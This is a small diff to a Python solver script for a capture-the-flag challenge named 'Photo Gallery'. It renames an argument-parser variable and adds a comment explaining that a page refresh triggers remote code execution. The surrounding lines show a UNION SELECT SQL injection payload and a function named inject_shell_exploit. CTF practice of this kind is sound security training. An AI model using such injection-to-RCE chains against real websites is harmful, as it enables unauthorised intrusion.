@@ -47,12 +47,12 @@ def find_flags(s: str) -> Iterable[str]:
 
 
 def parser() -> argparse.Namespace:
-    parser: ArgumentParser = argparse.ArgumentParser(
+    p: ArgumentParser = argparse.ArgumentParser(
         description="Script to get flags for Photo Gallery challenge",
     )
-    parser.add_argument("url", metavar="url", help="challenge url")
+    p.add_argument("url", metavar="url", help="challenge url")
 
-    return parser.parse_args()
+    return p.parse_args()
 
 
 def inject_shell_exploit(s: Session, url: str) -> None:
@@ -68,6 +68,8 @@ def get_all_flags(s: Session, url: str) -> Iterable[str]:
     payload: str = f"/fetch?id=4 UNION SELECT '{filename}'--"
     url_: str = url.strip("/") + payload
 
+    # Call the home page to refresh the website, such that id=3 is called
+    # and the RCE is executed.
     response: Response = s.get(url_)
     response.raise_for_status()
 
